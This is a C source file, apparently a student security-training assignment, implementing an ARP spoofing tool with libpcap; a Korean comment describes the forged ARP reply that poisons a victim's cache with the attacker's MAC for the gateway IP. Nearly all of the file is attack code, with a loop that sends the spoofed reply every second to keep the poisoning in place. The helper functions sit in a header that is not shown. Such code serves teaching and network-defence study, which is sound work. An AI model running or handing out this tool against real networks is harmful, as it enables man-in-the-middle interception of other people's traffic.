/*
    === Ethernet ===
    Dst MAC : 희생자의 MAC
    Src MAC : 내 MAC
    Protocol : 0x0806(ARP)

    === ARP ===

    Operation : ARP Reply
    Sender MAC : 내 MAC
    Sender IP : gateWay IP
    Target MAC : 희생자 MAC
    Target IP : 희생자 IP
*/
#include "initheader.h"
#include <pcap.h>
#include <stdio.h>
#include <stdint.h>

void usage() {
    printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
    printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[])
{
    char track[] = "개발";
    char name[] = "강동혁";
    printf("[bob8][%s]send_arp[%s]\n", track, name);

    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];    // wlan0
    char* sender_ip = argv[2];  // sender ip, victim
    char* target_ip = argv[3];  // target ip, gateway

    /* convert string ip to hexa ip */
    u_char src_ip[4];  // store hexa ip addr
    u_char tar_ip[4];
    inet_pton(AF_INET, sender_ip, &src_ip);  // convert string ip to hexa ip
    inet_pton(AF_INET, target_ip, &tar_ip);

    u_char srcMACaddr[6];
    u_char dstMACaddr[6];
    u_int16_t reqly = 0x0200;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }


    get_my_mac_addr(srcMACaddr);
    get_dst_mac_addr(srcMACaddr, src_ip, dstMACaddr, tar_ip, handle);
    u_char* buf = arp_packet_maker(srcMACaddr,src_ip,dstMACaddr,tar_ip,reqly);


    while(true){// send packet
        int res = pcap_sendpacket(handle,buf,42);
        if(res==-1){
            printf("Send Packet Error\n");
            break;
        }
        if(res==0){
            printf("ARP Spoofing Packet Sending..\n");
            sleep(1);
        }
    }

    pcap_close(handle);
    return 0;
}
